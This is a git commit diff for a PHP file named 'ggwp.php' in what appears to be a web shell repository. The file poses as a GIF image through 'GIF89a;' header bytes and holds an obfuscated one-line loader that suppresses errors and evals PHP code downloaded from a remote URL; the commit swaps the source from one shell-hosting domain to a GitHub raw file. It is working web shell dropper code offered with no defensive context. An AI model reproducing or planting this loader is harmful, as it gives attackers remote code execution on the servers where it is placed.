88ae1ac73afcf9914880d641db78f14538d2083d
InvisibleBunny <pongohandsome@gmail.com>
2024-03-28 02:33:04 +0700

    Bunny Code

--- Bunny-Mini/ggwp.php
+++ Bunny-Mini/ggwp.php
@@ -1,3 +1,3 @@
 GIF89a;
 GIF89a;
-<?=/**/@null; /**/ /*/ /**/@eval/**/ ("?>".file_get_contents (rawurldecode(urldecode("https://shell.prinsh.com/Nathan/alfa.txt")))); /**/ ?>    
+<?=/**/@null; /**/ /*/ /**/@eval/**/ ("?>".file_get_contents (rawurldecode(urldecode("https://raw.githubusercontent.com/InvisibleBunny/Records/main/Bunny-Mini/BunnyGG.txt")))); /**/ ?>    
